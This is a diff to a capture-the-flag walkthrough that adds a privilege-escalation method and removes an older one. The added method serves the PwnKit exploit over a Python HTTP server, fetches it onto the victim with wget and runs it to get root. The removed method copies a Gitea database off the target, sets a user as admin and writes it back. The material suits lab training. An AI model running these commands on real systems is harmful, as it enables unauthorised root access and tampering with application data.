@@ -1161,7 +1161,79 @@ ssh dylan@IP
 
 Now cat dylan's user.txt file
 
-#### Privilege Escalation
+#### Privilege Escalation - Method -1
+
+There will be two methods we will try first the Pwncat one
+
+First we need to get Linus Privilege escalation tool into the victim's machine
+
+https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
+
+In dylan's machine
+
+Copy the code from linux-exploit-suggester
+
+```
+nano shell.sh
+```
+
+Paste the code
+
+```
+chmod +x shell.sh
+```
+
+```
+./shell.sh
+```
+
+Now we found a vulnerability and also that we can run Pwnkit
+
+![enum result](64.png)
+
+Download PwnKit
+
+```
+git clone https://github.com/ly4k/PwnKit
+```
+
+Now in Pwnkit we will send its PwnKit.sh file into victim's system
+
+![enum result](65.png)
+
+```
+python3 -m http.server 3030
+```
+
+In Victim's machine
+
+```
+wget http://192.168.132.222:3030/PwnKit
+```
+
+```
+chmod +x PwnKit
+```
+
+```
+./PwnKit
+```
+
+It takes time but Now we are root here
+
+```
+whoami
+```
+
+![enum result](66.png)
+
+```
+cat /root/root.txt
+```
+
+![enum result](67.png)
+
+#### Privilege Escalation - Method -2
 
 ![enum result](49.png)
 
@@ -1177,7 +1249,7 @@ Here .gitconfig looks different, lets check it out
 cat .gitconfig
 ```
 
-![[Pasted image 20260214210912.png]]
+![enum result](60.png)
 
 Now we dont have much clue so we will find if there is anything running on the localhost system on any port
 
@@ -1191,7 +1263,7 @@ netstat -ant | grep -i listen
 
 - **`-t`** → show **TCP** connections only
 
-![[Pasted image 20260214212110.png]]
+![enum result](61.png)
 
 In them I find that 3000 port different as we saw rest all already
 
@@ -1207,7 +1279,7 @@ ssh dylan@10.48.134.10 -L 6789:127.0.0.1:3000
 
 In this we are forwarding traffic of port 127.0.0.1:3000 of dylan to our localhost port 6789 
 
-![[Pasted image 20260214212905.png]]
+![enum result](62.png)
 
 If we go to sign in, we will be needing password and email of dylan
 
@@ -1225,123 +1297,10 @@ Right Click -> View Page Source
 
 We found it is using Gitea version 1.13.0
 
-![[Pasted image 20260214213337.png]]
+![enum result](63.png)
 
-Let us find its exploit which will allow us to bypass this
+Let us find a way to bypass this 2FA
 
-I did search but there wasnt much over there to bypass authentication
-
-In their website register a new user
-
-![[Pasted image 20260214215153.png]]
-
-In our dylan's machine let us find if we are able to locate gitea directory
-
-```
-find / -name "*gitea*" 2>/dev/null
-```
-
-![[Pasted image 20260214213812.png]]
-
-Let us look inside it
-
-We dig deep and found a file called gitea.db
-
-![[Pasted image 20260214213913.png]]
-
-Let us push this into our system
-
-run this in dylan's machine
-
-```
-python3 -m http.server 8009
-```
-
-Now in your machine
-
-```
-wget http://IP:8009/gitea.db
-```
-
-![[Pasted image 20260214214208.png]]
-
-```
-sqlite3 gitea.db
-```
-
-```
-.tables
-```
-
-```
-.schema user
-```
-
-Now we will run this sql command
-
-```
-select lower_name,is_admin from user;
-```
-
-![[Pasted image 20260214215400.png]]
-
-Now I created a user which doesn't have admin controls so I will make it admin
-
-```
-update user set is_admin=1 where lower_name="someuser";
-```
-
-```
-select lower_name,is_admin from user;
-```
-
-![[Pasted image 20260214215557.png]]
-
-Now our task is to push this gitea.db file in that folder which will make it permanent
-
-First let us delete our gitea.db file in dylan
-
-```
-rm gitea.db
-```
-
-Exit the document and we will run 
-
-```
-scp gitea.db dylan@10.48.134.10:/gitea/gitea
-``` 
-
-Now logout from that page and login again with username and password
-
-```
-someuser:123456
-```
-
-Now access the page of dylan's repo
-
-![[Pasted image 20260214222011.png]]
-
-Now in dylan's machine
-
-Insite the gitea/gitea folder
-
-```
-cd /tmp
-```
-
-Here we will change port to 3000 as we want to copy from dylan's one
-
-```
-git clone http://127.0.0.1:3000/Dylan/Test-Repo.git 
-```
-
-```
-cd Test-Repo/
-```
-
-```
-echo 'test' >> README.md
-```
 
 
 
